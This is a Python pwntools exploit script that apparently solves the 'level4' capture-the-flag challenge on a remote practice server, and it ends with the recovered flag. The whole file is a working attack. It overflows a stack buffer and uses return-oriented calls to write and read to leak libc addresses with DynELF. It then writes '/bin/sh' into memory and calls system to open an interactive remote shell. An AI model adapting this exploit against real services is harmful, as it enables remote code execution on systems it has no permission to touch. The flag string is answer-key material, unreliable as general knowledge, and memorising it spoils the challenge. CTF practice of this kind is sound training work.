#!
#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
Warning it is worked on python2, but not python3
Some bug may be submitted
"""

import sys
import re
from os import path
from pwn import *
from pwnlib import gdb

context(arch="i386", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "level4")
_, host, port = re.split("\s+", "nc pwn2.jarvisoj.com 9880")

elf = ELF(elf_name)
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)


def leak(addr):
    payload = flat((
        b'!' * (0x88 + 4),
        elf.sym["write"],
        elf.sym["_start"],
        1, addr, 4,
    ))
    io.send(payload)
    return io.recv(4)


def main():
    payload = flat((
        b'!' * (0x88 + 4),
        elf.sym["read"],
        elf.sym["_start"],
        0, elf.bss(), 8,
    ))
    io.send(payload)
    sleep(0.5)
    io.send(b"/bin/sh\0")

    d = DynELF(leak, elf=elf)
    system_addr = d.lookup(b"system", b"libc")

    log.success("system_addr = 0x%x", system_addr)

    payload = flat((
        '!' * (0x88 + 4),
        system_addr,
        elf.sym["_start"],
        elf.bss(),
    ))

    io.send(payload)

    io.interactive()

if __name__ == "__main__":
    main()

# CTF{882130cf51d65fb705440b218e94e98e}
